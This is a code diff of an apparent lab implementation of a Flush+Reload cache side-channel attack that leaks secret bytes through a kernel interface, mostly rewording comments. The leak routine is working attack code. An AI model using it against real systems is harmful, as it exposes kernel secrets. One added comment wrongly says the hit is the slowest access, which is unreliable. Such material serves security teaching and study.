@@ -34,25 +34,23 @@ static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
 
+
 static void flush_probe_array(char *shared_memory) {
+    //Flushes all 256 page-spaced slots from cache	
     for (int i = 0; i < NUM_SLOTS; i++) {
         clflush(&shared_memory[i * PAGE_SIZE]);
     }
     __asm__ volatile("mfence" ::: "memory");
 }
 
+
 static int reload_and_find_hit(char *shared_memory) {
     int best_index = -1;
     uint64_t best_time = (uint64_t)-1;
- 
-    /*
-     * Randomize the order we probe to avoid hardware prefetcher artifacts.
-     * A simple way: iterate with a stride that covers all 256 values.
-     * We use a prime-step walk: start at a random-ish offset and add 167
-     * (coprime to 256) so we visit every slot exactly once.
-     */
+    
+    //Check all slots and see which requires the longest time access 
     for (int i = 0; i < NUM_SLOTS; i++) {
-        int idx = (i * 167 + 13) & 0xFF;   /* visits all 256 values */
+        int idx = (i * 167 + 13) & 0xFF;   
         volatile char *slot = (volatile char *)&shared_memory[idx * PAGE_SIZE];
  
         uint64_t t = time_access((void *)slot);
@@ -66,24 +64,23 @@ static int reload_and_find_hit(char *shared_memory) {
     return best_index;
 }
 
-static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset) {
-    int votes[NUM_SLOTS] = {0};
 
+static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset) {
+   int votes[NUM_SLOTS] = {0};
+    
+    //Run many trials to reduce noise
     for (int t = 0; t < TRIALS; t++) {
-        /* Step 1 – Flush the entire probe array from the cache. */
         flush_probe_array(shared_memory);
 
-        /* Step 2 – Ask the kernel to access shared_memory[4096 * secret_byte]. */
         call_kernel_part1(kernel_fd, shared_memory, offset);
 
-        /* Step 3 – Reload: find which slot is now cached. */
         int hit = reload_and_find_hit(shared_memory);
         if (hit >= 0) {
             votes[hit]++;
         }
     }
 
-    /* Return the byte value with the most votes. */
+    //Return slot index with the highest number of nominations
     int best_val = 0;
     for (int i = 1; i < NUM_SLOTS; i++) {
         if (votes[i] > votes[best_val]) {
@@ -92,6 +89,7 @@ static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset
     }
     return (unsigned char)best_val;
 }
+
 
 /*
  * run_attacker
